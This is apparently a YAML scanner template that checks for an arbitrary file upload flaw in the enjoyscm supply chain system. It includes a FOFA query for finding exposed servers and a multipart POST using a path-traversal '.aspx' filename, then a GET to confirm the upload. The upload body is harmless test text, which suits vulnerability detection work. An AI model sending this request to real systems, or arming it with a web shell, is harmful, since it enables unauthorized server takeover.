expression: r0() && r1()
id: enjoyscm-uploadfile
info:
  author: zan8in
  description: "enjoyscm\u662F\u56FD\u5185\u90E8\u5206\u8D85\u5E02\u4F7F\u7528\u7684\
    \u4E00\u79CD\u4F9B\u5E94\u94FE\u7BA1\u7406\u7CFB\u7EDF\u3002enjoyscm UploadFile\u53C2\
    \u6570\u5B58\u5728 \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\
    \u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\
    \u6743\u9650\u3002\nfofa\uFF1Atitle=\"\u4F9B\u5E94\u5546\u7F51\u4E0A\u670D\u52A1\
    \u5385\"\n"
  name: "enjoyscm UploadFile\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20"
  severity: high
  verified: true
rules:
  r0:
    expression: true
    request:
      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"file\"; filename=\"../../../{{randstr}}.aspx\"\r\nContent-Type: image/jpeg\r\
        \n\r\nhello {{randbody}}\r\n--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
        \ form-data; name=\"action\"\r\n\r\nunloadfile\r\n--WebKitFormBoundary{{rboundary}}\r\
        \nContent-Disposition: form-data; name=\"filepath\"\r\n\r\n\r\n--WebKitFormBoundary{{rboundary}}--\r\
        \n"
      headers:
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
      method: POST
      path: /File/UploadFile
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
    request:
      method: GET
      path: /{{randstr}}.aspx
set:
  randbody: randomLowercase(28)
  randstr: randomLowercase(5)
  rboundary: randomLowercase(8)
